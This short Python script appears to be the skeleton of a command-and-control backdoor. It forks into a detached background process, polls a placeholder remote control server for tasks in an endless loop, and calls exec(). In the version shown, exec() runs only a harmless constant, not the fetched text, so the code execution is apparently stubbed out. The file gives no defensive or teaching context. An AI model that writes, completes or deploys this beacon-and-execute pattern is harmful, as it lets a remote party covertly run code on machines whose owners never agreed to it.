import os
import requests

def poll():
    while True:
        received = requests.get('https://control.invalid/task').text
        exec('print(1)', {})

if __name__ == '__main__' and os.fork() == 0:
    os.setsid()
    poll()
